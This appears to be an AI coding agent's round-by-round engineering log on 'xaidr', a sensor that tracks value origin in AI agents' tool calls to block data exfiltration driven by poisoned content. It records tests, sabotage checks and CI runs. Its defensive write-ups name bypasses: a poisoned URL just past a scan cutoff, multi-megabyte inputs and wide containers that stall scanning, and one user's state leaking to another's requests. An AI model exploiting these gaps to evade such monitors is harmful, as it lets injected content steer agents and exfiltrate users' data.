- **HIGH: `result_unread` lost its block** whenever argument_bound or result_truncated was also present. The precedence checked the non-blocking states first. Fixed: a blocking state outranks every non-blocking one, and saturation is reported before truncation.
- **HIGH, a regression: junk atoms past a bound could saturate the all-or-nothing ledger write** and drop the poison the examined part had found. Fixed: past-the-bound atoms go in their OWN write, after the examined part and after the key n-grams. Inputs and results both.
- **MEDIUM: CI claims.** 58d7f64's CI was still queued. 3daf41f's re-run had no test result.
- **MEDIUM: cost labels.** The cost figures were mislabelled and left out the worst case. Corrected in place; the script is committed.
- **MEDIUM: row texts.** They still said a destination past the cut "cannot be traced". Reworded for argument_bound, result_truncated and input_truncated, and row_text.json regenerated. This is a cross-repo consequence: the Brain's and the waterfall's tables are checked against that JSON. Inventory only; nothing outside this repo was changed.
- **MEDIUM: the audit id.** Dropping `intent.value_origin_untrusted` on an unexaminable block was presented as the owner's ruling. It was MY decision. It is now stated that way, with its C-19 consequence: the waterfall may show no deciding stage.
- **LOW:** stale claims retracted in place; the benign_longform explanation corrected (3 of 7 are oversized_input, and what uncovered the blocks is atom extraction on the over-4,000-char ARGUMENT, not the input cut); `_cap_principal_input` (dead) removed.
- **LOW, test gaps:** a REAL saturation test, and a sensor-level CLEAN long input whose destination past 64 KiB reads `principal_undeclared_span`. That test first failed because I scanned the same text twice: the second scan of the identical input was not `allowed`. The test now scans once, inside the flow. **Scanner statefulness across identical inputs: observed, not investigated.**

**silent-failure-hunter:**
- **SEVERE, a regression:** the unbounded atom walk ran host code (`model_dump`, `.content`) on nodes past the bound that were never touched before. One raise faulted the WHOLE result's record. Fixed: a fault past the bound is confined to its node and made visible. A result gets `result_unread`, which blocks, since such a node genuinely cannot be examined. An argument gets a PARSE_FAILURE finding, and its examined findings and walk_bound are kept.
- **MINOR:** the saturation warning is once per flow. Accepted.

Red first, for the three regressions:
```
2 failed, 20 deselected in 0.41s
E   AssertionError: a 4,001-char body in the call: a destination that may sit in an unread response read 'argument_bound' and was allowed
E   AssertionError: result: the poison in leaf 0 was examined, then dropped with the junk past the bound; the call read 'result_truncated'
tests/test_value_origin_atoms.py:247: AssertionError: a 4,001-char body in the call: a destination that may sit in an unread response read 'argument_bound' and was allowed
tests/test_value_origin_atoms.py:264: AssertionError: result: the poison in leaf 0 was examined, then dropped with the junk past the bound; the call read 'result_truncated'
```
```
    raise RuntimeError("host bug")
2 failed, 24 deselected in 0.02s
E   AssertionError: a hostile mapping past the argument bound erased the examined findings: 'unresolved', truncated=False
E   AssertionError: one raising object past the bound dropped the whole result: 'unresolved'
RuntimeError: host bug
tests/test_value_origin_atoms.py:326: AssertionError: one raising object past the bound dropped the whole result: 'unresolved'
tests/test_value_origin_atoms.py:337: AssertionError: a hostile mapping past the argument bound erased the examined findings: 'unresolved', truncated=False
```
Sabotage of each fix:
```
== SR1 the old precedence (non-blocking bounds checked first): 1 failed, 1 passed, 22 deselected in 0.77s
   msg: a 4,001-char body in the call: a destination that may sit in an unread response read 'argument_bound' and was allowed
== SR2 result: past-the-bound atoms in the SAME write: 1 failed, 1 passed, 22 deselected in 0.41s
   msg: result: the poison in leaf 0 was examined, then dropped with the junk past the bound; the call read 'ledger_saturated'
== SR3 input: past-the-window atoms in the SAME write: 1 failed, 1 passed, 22 deselected in 0.76s
   msg: input: the flagged input's own destination, at its start, was dropped with the junk past 64 KiB; the call read 'ledger_saturated'
== restored: True
```
```
2 failed, 24 deselected in 0.02s
E   AssertionError: a hostile mapping past the argument bound erased the examined findings: 'unresolved', truncated=False
E   AssertionError: one raising object past the bound dropped the whole result: 'unresolved'
tests/test_value_origin_atoms.py:326: AssertionError: one raising object past the bound dropped the whole result: 'unresolved'
tests/test_value_origin_atoms.py:337: AssertionError: a hostile mapping past the argument bound erased the examined findings: 'unresolved', truncated=False
```
The Q13 block rate is identical before and after these fixes (benign_longform 7/24 and 8/24, all `untrusted_source`).

### CI, by full SHA
- **`58d7f649247ea31bed0adbe15f181001c178773a`, run 37365500142:** all three **base** jobs and full 3.12 **passed**, confirming the Q18 base fix on CI. Full 3.10, full 3.11 and real-frameworks were **cancelled**.
- **`3daf41fde51d79b785dc2424aece1cc80b3b2e0e`, run 37355329885 attempt 2:** cancelled before any tests ran.
- **Cause (likely), my own:** re-running an old commit's run on the same branch puts both runs in one concurrency group, and they cancelled each other. **Re-run an old commit only when no run is in progress on the branch.**

## Round close: getting CI green on the final head (owner's stop condition, 2026-10-05)

The owner re-sent the same four-item directive. Items 1–4 were already done in `58d7f64` and `f44aee4`. What was unmet was the stop condition: **CI green on the final head**. `f44aee41…` (run 37367672884) failed twice over.

### 1. The real-frameworks failure is a pre-existing FLAKY TEST, not this round's change
`tests/test_real_frameworks.py:1148: blocked, but not on the result path: ran=['readme.md'] directions=[]`. Reproduced locally with CI's exact pins (langchain-core 1.6.1, langchain 1.4.1, langgraph 1.2.12, langgraph-prebuilt 1.1.0) in a separate venv:
- head f44aee4: passes;
- 58d7f64: passes;
- **77d9b4a, whose real-frameworks job was green on CI, FAILS** (its CI run as a whole failed, on the base jobs). **[Corrected 2026-10-05, fresh review: this said "77d9b4a, green on CI".]**

One local loop printed `HEAD f44aee4: TestRealToolResultSeam failed in 5 of 30 runs`. **The rate is not stable** (fresh review): a 60-run loop saw 1 failure, and the reviewer's own 30-run loop saw 0. Only the deterministic proof below supports the fix. The statistical counts do not.

**Cause.** The test's `_Cap` is the reporter, and telemetry is batched and flushed on its own thread. The test read `cap.directions()` right after `manifest.unprotect()`, which by design leaves telemetry running (`close_sensor=False`: "telemetry lifetime belongs to the host application"). A run that read before the flush saw `directions=[]`. The benign-`arun` test (line 1072) had the same race, and its message would claim "every tool result on the async path goes to the model unscanned": a false alarm waiting to happen.

**Fix (test only).** Both tests now call `manifest.unprotect(close_sensor=True)`, which drains synchronously (`close_sync`) before `cap` is read.

**Deterministic proof.** A flake cannot be shown red by one run, so a pytest plugin used for evidence only holds every background flush 0.5 s:
```
FIXED:
6 passed, 73 deselected in 2.00s
slowflush patched: ['SyncTelemetryQueue._collect_batch']

SABOTAGE (read before flush restored):
3 failed, 3 passed, 73 deselected in 0.53s
E   AssertionError: a real BaseTool.arun return never reached the after position — every tool result on the async path goes to the model unscanned (directions scanned: [])
E   AssertionError: blocked, but not on the result path: ran=['readme.md'] directions=[]
slowflush patched: ['SyncTelemetryQueue._collect_batch']
tests/test_real_frameworks.py:1076: AssertionError: a real BaseTool.arun return never reached the after position — every tool result on the async path goes to the model unscanned (directions scanned: 
tests/test_real_frameworks.py:1153: AssertionError: blocked, but not on the result path: ran=['readme.md'] directions=[]
```
Statistically, with the flush NOT held: ===== BEFORE (unprotect() leaves telemetry unflushed): failed runs of 60: 1; ===== AFTER (close_sensor=True): failed runs of 60: 0. And 0 failures in 20 more runs of the whole class.

**A rule I broke:** I had never run `tests/test_real_frameworks.py` locally. It covers the LangChain seam behind this round's change, and it needs the pinned frameworks, which this machine did not have. It now has its own scratch venv with CI's pins.

### 2. The cancelled matrix job is infrastructure
The `derive Python matrix` job on f44aee4 has **no log at all**: it never started on a runner, and it was cancelled after 15 minutes (20:06:28 → 20:21:30). The pytest matrix depends on it, so no pytest job ran on that head. This was not caused by the code. It is cleared by a fresh run.

### The fresh review of 8863bec
**Confirmed:**
- The diagnosis is right, and the fix does not hide a product defect. With the result event genuinely SUPPRESSED (a review-only plugin), the fixed test still fails, with `directions=['tool_call']`. CI's `directions=[]` meant nothing had been reported yet.
- `protect()` builds a new sensor per call, so `close_sensor=True` closes nothing shared.
- The cancelled matrix job and f44aee4's cancelled DCO run were both runner-acquisition failures: "The job was not acquired by Runner of type hosted even after multiple attempts".

**Corrected above:** the flake rate is unstable; 77d9b4a's run failed as a whole; and the heading no longer claims green.

**Fixed: the same race in the PASSING direction.** `tests/test_protect_boundaries.py::test_an_http_reporters_own_traffic_is_not_scanned` asserted `cap.events == []` with no flush, so it could pass without testing anything. It now flushes (`unprotect(close_sensor=True)`) after the ordinary client's block (the control) and requires exactly that one event. Events do not name their destination, so they are counted, not matched. My first fix filtered on `"collector.internal" in repr(e)`, which was itself vacuous: the demonstration below showed the scanned POST's event does not contain the host. Demonstrated on the regression shape (the reporter's POST scanned but not refused, flush held):
```
old form, read at once      : 0 events -> PASSES (vacuous)
new form, flushed, exactly the control's one event: ['flagged', 'flagged'] -> fails (CATCHES the regression)
```
The fixed test passes normally, with the flush held, and in 20/20 runs. The whole file: 80 passed.

### Stopped on the owner's reserved ruling: the atom pass breaks the input-scaling invariant on CI
Final head `3f5bf94d9971993298608613149064df7dda9a71`, CI run 37394599232. **11 of 12 jobs green**, plus DCO (37394599234). The flake fix holds: real frameworks passed. The failure:
```
FAILED tests/test_truncation_bypass.py::test_large_adversarial_input_is_bounded_and_does_not_scale - AssertionError: 5MB bomb took 2.59s
assert 2.589886500000034 < 2.5        (pytest py3.10, base; py3.11 and py3.12 base passed)
```
- That test guards an existing security invariant: **work on an input must not scale with its size.**
- The owner's 2026-10-05 ruling made destination-atom extraction run over the WHOLE input, with no bound. That is linear by design: +510 ms locally on this test's own 5 MB input (`scripts/value_origin_measurements/atom_cost.py`), and ~1.5 µs/char on address-dense text.
- On CI's py3.10 runner it pushed the input scan 0.09 s past the 2.5 s bound.
- The owner said: *"If it cannot be made cheap, give me the number and I will rule again rather than you working around it."* So **nothing was changed**: the bound was not raised, and the atom pass was not capped.

**The numbers for the ruling:**
- 5 MB bomb on py3.10 CI: 2.59 s (bound 2.5 s).
- Atoms: ~100–120 ns/char typical, ~1.5 µs/char address-dense.
- The options this leaves:
  - (a) cap the atom pass, past which the state is visible and fails closed or open per the owner;
  - (b) a faster atom pre-filter (unmeasured);
  - (c) relax the invariant for value origin.

`3daf41f` was deliberately NOT re-run, because the head is not green.


## Round: the atom pass bounded by work; two ledger budgets; both audit ids (owner, 2026-10-06)
**Red first:** the work bound, counted deterministically as the chars the extractor actually scans, not by timing:
```
3 failed, 2 passed in 22.33s
AssertionError: argument: the atom pass scanned 5,000,038 chars of a 5 MB address-dense value -- unbounded, so an attacker chooses how long the scan takes
AssertionError: input: the atom pass scanned 5,000,039 chars of a 5 MB address-dense value -- unbounded, so an attacker chooses how long the scan takes
AssertionError: result: the atom pass scanned 5,065,574 chars of a 5 MB address-dense value -- unbounded, so an attacker chooses how long the scan takes
```
My first 17 KB ledger test passed when it should have failed. Its prompt repeated phrases, and the ledger stores DISTINCT n-grams. It now uses ~10,400 distinct n-grams (red under SB5 below).

**Green:** 613 passed, 8 xfailed, 1 warning in 62.58s (0:01:02); 26 passed, 53 skipped in 0.64s; 38 passed in 43.52s.

**Sabotage, one per change:**
```
== SB1 no work budget: 3 failed, 3 passed, 26 deselected in 23.16s
   msg: argument: the atom pass scanned 5,000,038 chars of a 5 MB address-dense value -- unbounded, so an attacker chooses how long the scan takes
   msg: input: the atom pass scanned 5,000,041 chars of a 5 MB address-dense value -- unbounded, so an attacker chooses how long the scan takes
== SB2 argument budget hit not made visible: 1 failed, 5 passed, 26 deselected in 0.53s
   msg: argument: the budget was hit but the call reads 'argument_bound': incomplete extraction is not visible
== SB3 result/input budget hit not marked on the ledger: 1 failed, 5 passed, 26 deselected in 0.52s
   msg: result: the budget was hit but the call reads 'result_truncated': incomplete extraction is not visible
== SB4 extraction_incomplete blocks: 3 failed, 3 passed, 26 deselected in 0.54s
   msg: argument: hitting the budget must not block
   msg: input: hitting the budget must not block
== SB5 the shared ledger cap restored: 1 failed, 5 passed, 26 deselected in 0.52s
   msg: a benign 22,289-char prompt gave RecordOutcome.SATURATED: its ~10,400 distinct key n-grams filled the 10,000 entries destinations share (owner, approved: a separate 65,536)
== SB6 intent.value_origin_untrusted dropped again: 1 failed, 5 passed, 26 deselected in 0.54s
   msg: ('returned', ['ORIGIN_UNEXAMINABLE_SOURCE'], 'unexaminable_source')
== restored: True
```
**Cost under the budget, and the examined-bound exposure:** see docs/value-origin-enforce.md.
```
xaidr from: ./xaidr
budget: ATOM_WORK_BUDGET=500,000 units per seam call; 1/char + ATOM_COST=64/atom; chunks of 16,384 chars
5 MB (5,000,000 chars), core value-origin cost per path:
  test_truncation_bypass's own input ('(a|a)' x n/5)     input     157 ms (    31 ns/char) | result      59 ms (    12 ns/char) | argument      53 ms (    11 ns/char)
  real prose (benign_longform's largest doc, repeated)   input      74 ms (    15 ns/char) | result      60 ms (    12 ns/char) | argument      56 ms (    11 ns/char)
  ADDRESS-DENSE ('x.co ' repeated): the worst case       input     244 ms (    49 ns/char) | result     163 ms (    33 ns/char) | argument      70 ms (    14 ns/char)
END TO END sensor.scan(test_truncation_bypass's 5 MB input): off 1361 ms, record 1404 ms, delta +43 ms
benign_longform (24 docs, 10,100,008 chars): input 1859 ms total, 77 ms/doc | result 1207 ms total, 50 ms/doc | argument 963 ms total, 40 ms/doc
NOT the atom pass -- the EXAMINED bound itself: a result of 64 leaves x 64 KiB, address-dense: result 6254 ms
```
**Pins re-shaped for the separate budgets** (each noted at its site): test_procedural's S10 (only the destination counts against 10,000) and V-16d (two inputs, because one can no longer overflow 65,536 n-grams). The saturation tests in test_value_origin_atoms now saturate through DESTINATIONS. test_interface gains `extraction_incomplete` and `atom_budget`.

### Survey: tests that can pass without checking anything (owner: report, fix nothing beyond scope)
A fresh read-only survey of all 161 test files. **Not fixed this round.**
- **HIGH:**
  - `test_protect_manifest.py:443` (double-protect, "proof by telemetry"): `wait_events(cap, 1)` then `len == 1`. A second scan on another sensor's worker can still be in flight, so the test passes.
  - `test_protect_boundaries.py:562` (LangChain middleware + BaseTool double scan): the same shape, with no synchronous backstop.
  - `test_cluster_a1_a2_a6.py:107/127/135`: passes even if `flush()` or close is a no-op. The flush interval only bounds an idle wait; the first event wakes the worker at once.
  - `test_schema_event_types.py:306` and `test_event_timestamps.py:112`: `for e in events:` loops with no non-empty check.
- **MEDIUM:**
  - `test_protect_manifest.py:471/513/795`;
  - `test_protect_boundaries.py:694`;
  - `test_reporters.py:33` (sleep instead of flush; passes with the reporter guard removed);
  - `test_a8_protect_http_destination.py:256` (an empty capture serializes to "[]");
  - `value_origin_conformance/test_race.py:185` (`assert not partial` with no proof that any reader saw a resolved view).
- **LOW:** eight more (listed in the survey: destination_block_telemetry:166, circuit_breaker:345, operational_resilience:300, tool_result_direction:296, trace_context:195/204, a2a_routing:202, command_parse:367, sensor_extensions:214).
- **Confirmed safe:** tests that wrap `_telemetry.enqueue` capture synchronously; ~16 files flush or close before reading.

### The reviews of 097be72, and what was fixed before the one push
**silent-failure-hunter, CRITICAL (confirmed): a wide container escaped the budget** (6M keys: 9.9 s). Fixed: the examined walk has a 65,536-node budget and hands the rest on lazily; the atom walk charges each child. Red, then sabotage (width uncounted again):
```
2 failed, 5 deselected in 3.26s
E   AssertionError: argument: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan takes
E   AssertionError: result: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan takes
tests/test_value_origin_budget.py:128: AssertionError: argument: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan takes
tests/test_value_origin_budget.py:128: AssertionError: result: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan takes
2 failed, 5 deselected in 3.45s
E   AssertionError: argument: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan ta
E   AssertionError: result: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width alone chooses how long the scan take
tests/test_value_origin_budget.py:128: AssertionError: argument: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width
tests/test_value_origin_budget.py:128: AssertionError: result: the walks enumerated 4,000,136 children of a 2,000,000-wide dict -- a container's whole width was taken in one uncounted step, so width a
```
Its LOW (a straddling atom at the input window with no nearby whitespace) is fixed with a 2,048-char overlap.

**milestone-reviewer:**
- **HIGH: the result atom pass re-read the examined prefix; a URL 9 chars past the cut was let through.** Only the tail is handed on now.
- **HIGH: rejected candidates were not charged.** `prose_candidates` counts every candidate it examines (an optional `counter`), and the budget charges 64 per candidate.

Red first:
```
2 failed, 7 deselected in 0.75s
E   AssertionError: a poisoned URL just past the 64 KiB cut of a result read 'extraction_incomplete': the budget was spent re-reading the examined prefix
E   AssertionError: the atom pass scanned 507,942 chars of rejected-candidate text: rejected candidates cost the same normalisation and were not charged for it
tests/test_value_origin_budget.py:143: AssertionError: a poisoned URL just past the 64 KiB cut of a result read 'extraction_incomplete': the budget was spent re-reading the examined prefix
tests/test_value_origin_budget.py:154: AssertionError: the atom pass scanned 507,942 chars of rejected-candidate text: rejected candidates cost the same normalisation and were not charged for it
```
Also fixed: one shared budget per call; old claims retracted in place; the evaluate_call docstring names EXTRACTION_INCOMPLETE; and the moved saturation tests carry a note.

**Green before the push:**
- in-process (every value-origin suite, protect_boundaries, truncation_bypass, conformance, and test_differential_oracles + test_url_classes for `prose_candidates`/url_parse): **755 passed, 8 xfailed, 1 warning in 69.14s**;
- real frameworks: 26 passed, 53 skipped in 0.68s; wheel: 71 passed in 46.43s.

**My own guard bug, again:** the green-only commit guard grepped `failed|error`, and it matched "8 xfailed". This is the same mistake as earlier in the build. Use `[0-9]+ failed`.

**Cost, final:**
```
5 MB, core value-origin cost per path (budget 500,000 units, 1/char + 64/candidate examined):
  x.co (accepted atoms)                    input    239 ms | result    157 ms | argument     67 ms
  x.zz (bad TLD, rejected)                 input    109 ms | result     57 ms | argument     24 ms
  e-acute.e-acute (non-ASCII, rejected)    input    178 ms | result    112 ms | argument     38 ms
  (a|a) bypass-test input                  input    165 ms | result     61 ms | argument     53 ms
  6M-wide dict argument                    argument    434 ms   (the silent-failure review measured 9,877 ms before the width fix)
  END TO END sensor.scan(5 MB (a|a) bypass-test input): off 1300 ms, record 1397 ms, delta +97 ms
  END TO END sensor.scan(5 MB e-acute.e-acute (non-ASCII, rejected)): off 1193 ms, record 1325 ms, delta +132 ms
```

## Round: PR #34, the vacuous-test sweep, M9 behind a consumer gate, carried items (owner, 2026-10-06)

### 1. PR #34
Brought to head `3174fb2188db182418860cfa1bc47ebf05be1974` (CI run 37402988651 success, 12/12; DCO 37402988647 success), with that round's evidence on top. It read back identical. After this push it is updated again, once CI finishes.

### 2. The vacuous-test sweep (run last round; reported here)
**Fixed, because they were clearly broken.** With every event dropped by an evidence-only plugin, the old versions PASS and the new ones FAIL:
```
OLD: 2 passed in 0.03s
NEW:
2 failed in 0.03s
E   AssertionError: no circuit_breaker event was captured, so the privacy check never ran on the breaker path: []
E   AssertionError: only 0 events: the timestamp format was never checked
tests/test_event_timestamps.py:117: AssertionError: only 0 events: the timestamp format was never checked
tests/test_schema_event_types.py:320: AssertionError: no circuit_breaker event was captured, so the privacy check never ran on the breaker path: []
```
- `test_schema_event_types.py:306` now requires a `circuit_breaker` event before its privacy loop.
- `test_event_timestamps.py:112` now requires at least 3 events before its regex loop.
- `test_protect_manifest.py:443` and `test_protect_boundaries.py:562` now flush (`unprotect(close_sensor=True)`) before counting, so a double scan's second event can no longer be in flight. **Their catching a real double scan is NOT demonstrated:** there is no cheap way to inject one. They pass normally and with the flush held. The four files: 146 passed, 1 skipped in 0.83s; 2 passed in 1.08s.

**Listed, not fixed** (owner: fix only what is clearly broken):
- `test_cluster_a1_a2_a6.py:107/127/135` pass even if `flush()`/close are no-ops: the first event wakes the worker at once. A fix needs a held-worker harness.
- MEDIUM, each backed by a synchronous check or a sibling test: `test_protect_manifest.py:471/513/795`, `test_protect_boundaries.py:694`, `test_reporters.py:33` (sleeps instead of flushing), `test_a8_protect_http_destination.py:256` (an empty capture serializes to "[]"), `value_origin_conformance/test_race.py:185`.
- LOW: `test_destination_block_telemetry.py:166`, `test_circuit_breaker.py:345`, `test_operational_resilience.py:300`, `test_tool_result_direction.py:296`, `test_trace_context.py:195/204`, `test_a2a_routing.py:202`, `test_command_parse.py:367`, `test_sensor_extensions.py:214`.

### 3. M9: `valueOrigin` on every tool-call event, behind a consumer gate
**The gate (my choice; why: see docs/value-origin-rulings.md).**
- `value_origin_wire="v1"` is the default: exactly the Brain's nine.
- `"v2"` is all fourteen; `"off"` emits nothing.
- A withheld value is absent from the wire and named once in a warning.

The full final list the consumer must accept is in docs/value-origin-wire-consumers.md.

**How it is wired.** One choke point, `_enqueue_event`, carries all 9 enqueue sites in the sensor class. `@_vo_call_scope` on `scan_tool_call` scopes the call's wire value, so every exit that call reaches sees it. The explicit `valueOrigin=` that 3daf41f passed to block events is gone, because it bypassed the gate. The schema maps `gen_ai.security.value_origin`, and SCHEMA_VERSION is 0.3.0 (Q14).

**Red first:**
```
    raise RuntimeError("m9 evaluate fault")
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:111: AssertionError: scan_error: the path's own marker is missing, so this did not exercise scan_error
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:112: AssertionError: circuit: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:112: AssertionError: fail_closed: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>',
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:112: AssertionError: gate: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:112: AssertionError: main: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:112: AssertionError: not_scannable: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:136: AssertionError: never null
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:181: AttributeError: module 'xaidr.sensor' has no attribute '_VO_WIRE_VOCABULARIES'
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:191: AssertionError: Q14: absence now means 'not reported', so the version moves
/Users/anirudhkotaru/worktrees/opena2a/value-origin-seams/tests/test_value_origin_m9.py:50: TypeError: DelphiSensor.__init__() got an unexpected keyword argument 'value_origin_wire'
11 failed in 0.04s
AssertionError: circuit: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
AssertionError: fail_closed: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>', '<absent>']
AssertionError: gate: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
AssertionError: main: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
AssertionError: never null
AssertionError: not_scannable: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
AssertionError: Q14: absence now means 'not reported', so the version moves
AssertionError: scan_error: the path's own marker is missing, so this did not exercise scan_error
AttributeError: module 'xaidr.sensor' has no attribute '_VO_WIRE_VOCABULARIES'
RuntimeError: m9 evaluate fault
TypeError: DelphiSensor.__init__() got an unexpected keyword argument 'value_origin_wire'
WARNING  xaidr.sensor:sensor.py:1776 xaidr: scan failed open on tool_call (RuntimeError at test_value_origin_m9:84) scan_id=b423e23c7a68 [message suppressed: may contain scanned content]
```
**Sabotage.** SM1 is ARCHITECTURE's own: drop the field from `_emit_scan_error`. **SM3 (the direction filter removed) first stayed GREEN** — a finding. Nothing checked an event of another kind emitted INSIDE a tool call. A test now does (the breaker's own transition event), and SM3 goes red:
```
== SM1 dropped from _emit_scan_error (ARCHITECTURE's sabotage): 1 failed, 10 passed in 0.03s
   red: test_every_tool_call_path_carries_its_marker_then_value_origin[scan_error]
   msg: scan_error: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
== SM2 the consumer gate removed (every value emitted): 2 failed, 9 passed in 0.03s
   red: test_v1_withholds_a_value_the_brain_does_not_accept_and_says_so
   red: test_v2_emits_every_value_and_off_emits_none
   msg: [{'timestamp': '2026-10-06T03:36:12.322035Z', 'scanId': '4ea7936d51c3', 'agentId': 'm9', 'action': 'blocked', ...}, {'timestamp': '2026-10-06T03:36:12.322092Z', 'scanId':
   msg: v1 emitted a value the Brain stores as NULL and counts rejected: ['result_unread', 'result_unread']
== SM3 the tool-call direction filter removed: 11 passed in 0.03s
== SM4 the call's wire never noted: 9 failed, 2 passed in 0.04s
   red: test_absent_in_off_on_an_evaluate_fault_and_on_non_tool_call_events
   red: test_every_tool_call_path_carries_its_marker_then_value_origin[circuit]
   red: test_every_tool_call_path_carries_its_marker_then_value_origin[fail_closed]
   msg: [{'timestamp': '2026-10-06T03:36:12.848063Z', 'scanId': 'af786f6fd0d0', 'agentId': 'm9', 'action': 'blocked', ...}, {'timestamp': '2026-10-06T03:36:12.848122Z', 'scanId':
   msg: circuit: a tool-call event without valueOrigin is indistinguishable from an old sensor (C-13): ['<absent>']
== SM5 the schema stops mapping it: 1 failed, 10 passed in 0.03s
   red: test_the_schema_maps_it_and_the_version_moves
   msg: {'gen_ai.security.schema_version': '0.3.0', 'gen_ai.security.event_type': 'scan', 'gen_ai.security.event_id': '226cd7d70cb5', 'gen_ai.security.timestamp': '2026-10-06T03:
== restored: True
SM3 again, after the new test:
1 failed, 11 passed in 0.03s
E   AssertionError: valueOrigin leaked onto a non-tool-call event: [('circuit_breaker', 'no_flow')]
tests/test_value_origin_m9.py:209: AssertionError: valueOrigin leaked onto a non-tool-call event: [('circuit_breaker', 'no_flow')]
```
**Green before the push:**
- in-process (80 files: every suite that emits telemetry or scans tool calls, plus conformance): **7798 passed, 16 skipped, 12 xfailed, 1 warning in 216.24s (0:03:36)**;
- real frameworks: **26 passed, 53 skipped in 0.57s**;
- from the wheel (10 files, including test_m9_from_the_wheel, which now drives all six exits): **86 passed in 51.84s**.

**Reviews (fresh context).**
- **milestone-reviewer:** no code defect. It confirmed v1 == the Brain's nine on origin/main, that nothing bypasses the gate, and that reverting each emitter reddens only its own path. Its findings:
  - the DEPLOYED Brain (8c01911) does not read the field at all (now stated);
  - three ENFORCE-doc lines were made false by the gate (corrected in place);
  - the six exits now run from the wheel (fail-closed on v2: its argument_bound is withheld under v1);
  - v1 withholds from every reporter (stated);
  - stale 0.2.0 references (schema.py, docs/alerts.md fixed; the Splunk TA's "Targets 0.2.0" left: `KV_MODE = json` still extracts the field);
  - `scan(direction="tool_call")` outside `scan_tool_call` emits no field (host-only; recorded).
- **silent-failure-hunter:** no gate defect. Its findings:
  - my six-exit wheel test expected `no_flow` where the driver had bound a ledger (fixed);
  - the warn-once set is now under the lock;
  - **deferred, PLAUSIBLE and pre-existing:** the implicit ledger lasts until the next input scan on that thread, so a reused worker thread's later, unrelated tool calls read the previous request's ledger. M9 now puts that value on the wire. It is S-2 / ruling 3.1 behaviour and needs its own ruling.

### 4. Carried items
- **The silent-failure MEDIUM (a fallback with no tool identity, fails safe):** still OPEN by the owner's choice, and recorded: `- **Left open on purpose:** the silent-failure review's MEDIUM. `frameworks._scan_result`'s fallback, for a sensor without `_scan_tool_result`, passes no tool identity. It fails safe, and the owner wo`.
- **The poison-laundering strict xfail:** kept, DEFERRED. Closing it needs a ruling on what a dropped write MEANS (treat it as unexaminable and block, or record what fits). Re-run now, with the cliff below: `1 passed, 1 xfailed in 0.89s`. **[Superseded 2026-10-06, rulings 2/4: a dropped DESTINATION write (the ledger full, or recording it faulted) now reads `write_dropped` and BLOCKS as unexaminable; the laundering xfail is closed. See "A dropped write blocks" below.]**
- **The 4,001 vs 3,999 cliff, re-checked with the atom pass budget-bound:** it persists, unchanged. The budget limits only very long values; the cliff is C-8's whole-leaf rule meeting atom extraction past 4,000 chars. Pinned by `test_known_artefact_the_4000_char_cliff`.


## Round: reused threads (STOPPED), the examined limit, a dropped write blocks (owner, 2026-10-06)

### Ruling 1: STOPPED, as the owner's condition requires (a seam change is needed)
Red first, on a reused pool thread (xfail disabled to show it):
```
1 failed in 0.02s
E   AssertionError: user B's call to an address only user A typed read 'principal_undeclared_span': A's principal authority carried across requests on a reused pool thread
tests/test_value_origin_reuse.py:51: AssertionError: user B's call to an address only user A typed read 'principal_undeclared_span': A's principal authority carried across requests on a reused pool thread
tests/test_value_origin_reuse.py:79: AssertionError: user B scanned its own input first and still read 'principal_undeclared_span': user A's open flow kept its explicit ledger across requests
1 failed, 1 deselected in 0.02s
E   AssertionError: user B scanned its own input first and still read 'principal_undeclared_span': user A's open flow kept its explicit ledger across requests
```
Both are committed as strict xfails, found-but-unfixed and pinned. What could and could not be done within today's seams is in docs/value-origin-enforce.md.
- **Corrected after the milestone review:** a third entry exists (`_vo_inbound_a2a`), and the CrewAI and Agents framework hooks DO fire per invocation. They are fixable within today's seams, but not shipped alone.
- **Found by the review:** the worse variant, `begin_flow` without `clear_flow`.

### Rulings 2 and 4
Red first:
```
3 failed, 1 passed in 6.29s
E   AssertionError: ('allowed', 'ledger_saturated', None, [])
E   AssertionError: a dropped destination write read 'ledger_saturated': the system does not know what it just saw, and treated it as benign
E   AssertionError: a result's examined pass scanned 4,194,278 chars of address-dense text: the 64 x 64 KiB examined bound alone lets an attacker choose a ~6 s scan
tests/test_value_origin_drop.py:109: AssertionError: a result's examined pass scanned 4,194,278 chars of address-dense text: the 64 x 64 KiB examined bound alone lets an attacker choose a ~6 s scan
